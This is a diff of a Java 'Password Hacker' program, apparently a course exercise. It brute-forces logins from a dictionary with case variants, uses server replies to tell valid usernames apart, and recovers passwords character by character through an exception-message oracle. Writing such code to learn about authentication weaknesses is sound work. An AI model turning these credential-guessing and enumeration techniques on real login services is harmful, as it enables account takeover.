@@ -7,13 +7,14 @@ import hacker.json.ServerResponse;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
 import java.util.stream.Collectors;
 
 import static hacker.data.Config.LOGINS_DIRECTORY;
 import static hacker.data.Config.PASSWORDS_DIRECTORY;
-import static hacker.main.Main.Responses.SUCCESS;
+import static hacker.main.Main.Responses.*;
 
 public class Main {
      enum Responses {
@@ -31,17 +32,41 @@ public class Main {
     }
 
     public static void main(String[] args) throws IOException {
+         /*
+
+
+
+
+
+         IMPORTANT!!!
+         Make sure to add Gson as a dependency each time you load IntelliJ. build.gradle is at C:\Users\andre\IdeaProjects\Password Hacker (Java)\build.gradle
+
+
+
+
+
+          */
         String ipAddress = args[0]; int port = Integer.parseInt(args[1]);
         try (Socket socket = new Socket(ipAddress, port);
              DataInputStream input = new DataInputStream(socket.getInputStream());
              DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
-            System.out.println(bruteForcePasswordUsingDictionary("admin", input, output).orElse("Password not found."));
+            Gson gson = new Gson();
+            String login = bruteForceLoginUsingDictionary(input, output).orElse("Login not found");
+            String password = findPasswordUsingVulnerability(login, input, output).orElse("Password not found.");
+            System.out.println(gson.toJson(new LoginPasswordPair(login, password)));
         }
     }
 
+    /**
+     * Brute force the login using the dictionary of logins.
+     * @param input the input stream to which to respond if the password was correct or not
+     * @param output the output stream to which to send the attempted password
+     * @return an Optional containing either the correct login or nothing
+     * @throws IOException if something goes wrong with the input/output of data
+     */
     private static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input, DataOutputStream output) throws IOException {
         try (Reader reader = new FileReader(LOGINS_DIRECTORY)) {
-            // Holds the current password being checked from passwords.txt
+            // Holds the current login being checked from passwords.txt
             StringBuilder commonLoginBuilder = new StringBuilder();
             // Holds each char that is read, used in the while loop
             int i;
@@ -54,13 +79,13 @@ public class Main {
                     // Doesn't need to try case combinations if the password is a number
                     if (commonLogin.matches("[0-9]+")) {
                         output.writeUTF(commonLogin);
-                        if (SUCCESS.getMessage().equals(input.readUTF())) {
+                        // When it says wrong password, that means the login is correct
+                        if (WRONG_PASSWORD.getMessage().equals(input.readUTF())) {
                             return Optional.of(commonLogin);
                         }
                     } else {
-                        BinaryFilter filter = new BinaryFilter(commonLogin.length());
-                        String[] allCaseCombinations = filter.modifyStringAllCombinations(commonLogin, Character::toUpperCase);
-                        Optional<String> possibleCorrectLogin = tryArrayOfPasswords("admin", allCaseCombinations, input, output);
+                        List<LoginPasswordPair> allCaseCombinations = generateCaseList(commonLogin, 1);
+                        Optional<String> possibleCorrectLogin = tryListOfLoginPasswordPairs(allCaseCombinations, 1, input, output);
                         if (possibleCorrectLogin.isPresent()) {
                             return possibleCorrectLogin;
                         }
@@ -75,12 +100,64 @@ public class Main {
     }
 
     /**
+     * Finds the password using the vulnerability in stage 4 where an inputted password that matches the beginning of the correct password will return an exception
+     * message.
+     * @param login the correct login to use when finding the password
+     * @param input the input stream to which to respond if the password was correct or not
+     * @param output the output stream to which to send the attempted password
+     * @return an Optional containing either the correct password or nothing
+     * @throws IOException if something goes wrong with the input/output of data
+     */
+    private static Optional<String> findPasswordUsingVulnerability(String login, DataInputStream input, DataOutputStream output) throws IOException {
+         StringBuilder attemptedPasswordBuilder = new StringBuilder("a");
+         int currentLength = 1;
+         // The character which is being changed to try to find the password
+         char volatileChar = 'a';
+        while (true) {
+            // 0 without apostrophes is null
+            if (volatileChar == 0) {
+                return Optional.empty();
+            } else {
+                attemptedPasswordBuilder.replace(currentLength - 1, currentLength, String.valueOf(volatileChar));
+                ServerResponse response = tryLoginPasswordPair(new LoginPasswordPair(login, attemptedPasswordBuilder.toString()), input, output);
+                if (response.getResult().equals(SUCCESS.getMessage())) {
+                    return Optional.of(attemptedPasswordBuilder.toString());
+                } else if (response.getResult().equals(EXCEPTION.getMessage())) {
+                    ++currentLength;
+                    attemptedPasswordBuilder.append("a");
+                    volatileChar = 'a';
+                } else {
+                    volatileChar = vulnerabilityNextCharacter(volatileChar);
+                }
+            }
+        }
+    }
+
+    /**
+     * Get the next character for use with the stage 4 vulnerability
+     * @param character the character from which to get the next character
+     * @return the next character
+     */
+    private static char vulnerabilityNextCharacter(char character) {
+        // When going to the next character, it goes from a-z to A-Z to 0-9 and lastly to ascii code of 0, which is null
+         if (character == 'z') {
+             return 'A';
+         } else if (character == 'Z') {
+             return '0';
+         } else if (character == '9' || character == 0) {
+             return 0;
+         }
+         return (char) (character + 1);
+    }
+
+    /**
      * Brute forces the password using the provided dictionary of passwords in passwords.txt. Also tries all possible combinations of cases of each password.
      * @param input the input stream to which to respond if the password was correct or not
      * @param output the output stream to which to send the attempted password
      * @return either an empty Optional or an Optional containing the correct password
      * @throws IOException if something goes wrong with the input/output of data
      */
+    @Deprecated
     private static Optional<String> bruteForcePasswordUsingDictionary(String login, DataInputStream input, DataOutputStream output) throws IOException {
         try (Reader reader = new FileReader(PASSWORDS_DIRECTORY)) {
             // Holds the current password being checked from passwords.txt
@@ -118,7 +195,7 @@ public class Main {
     }
 
     /**
-     * Takes a login password pair object and sends it to the sever.
+     * Takes a login password pair object and sends it to the sever, then returns the server response for that pair.
      * @param pair the pair object to be sent
      * @param input the input stream to which to respond if the pair was correct or not
      * @param output the output stream to which to send the attempted pair
@@ -130,6 +207,38 @@ public class Main {
         String json = gson.toJson(pair, LoginPasswordPair.class);
         output.writeUTF(json);
         return gson.fromJson(input.readUTF(), ServerResponse.class);
+    }
+
+    /**
+     * Takes a list of login password pairs and, if the mode is 1, returns the correct login or an empty Optional, or if the mode is 2, returns the correct password/beginning
+     * of the correct password or an empty Optional.
+     * @param pairs the list of pairs to try
+     * @param mode the mode of the method. 1 looks for the correct login, 2 looks for the correct password/beginning of the correct password
+     * @param input the input stream to which to respond if the pair was correct or not
+     * @param output the output stream to which to send the attempted pair
+     * @return an Optional corresponding with the mode
+     * @throws IOException if something goes wrong with the input/output of data
+     */
+    private static Optional<String> tryListOfLoginPasswordPairs(List<LoginPasswordPair> pairs, int mode, DataInputStream input, DataOutputStream output) throws IOException {
+        Gson gson = new Gson();
+        for (LoginPasswordPair pair : pairs) {
+            String json = gson.toJson(pair, LoginPasswordPair.class);
+            output.writeUTF(json);
+            String response = gson.fromJson(input.readUTF(), ServerResponse.class).getResult();
+            switch (mode) {
+                // Finding login
+                case 1:
+                    if (response.equals(WRONG_PASSWORD.getMessage())) {
+                        return Optional.of(pair.getLogin());
+                    }
+                // Finding password
+                case 2:
+                    if (response.equals(EXCEPTION.getMessage()) || response.equals(SUCCESS.getMessage())) {
+                        return Optional.of(pair.getPassword());
+                    }
+            }
+        }
+        return Optional.empty();
     }
 
     /**
@@ -150,6 +259,28 @@ public class Main {
             }
         }
         return Optional.empty();
+    }
+
+    /**
+     * Takes a String value as input,
+     * can be either a login or a password, and 1 or 2 as a mode, 1 being for login and 2 being for password,
+     * and returns a list of login pairs
+     * containing all case variations of the passed value in the corresponding spot.
+     * @param value the value, either login or password, to get case variations of
+     * @param mode generates variants of either the login or the password, 1 generates login variants, 2 generates password variants
+     * @return the list of login pairs containing all case variations of the value
+     */
+    private static List<LoginPasswordPair> generateCaseList(String value, int mode) {
+        BinaryFilter filter = new BinaryFilter(value.length());
+        return switch (mode) {
+            // Login
+            case 1 ->
+                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair(x, "a")).toList();
+            // Password
+            case 2 ->
+                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair("a", x)).toList();
+            default -> generateCaseList(value, 1);
+        };
     }
 
     /**
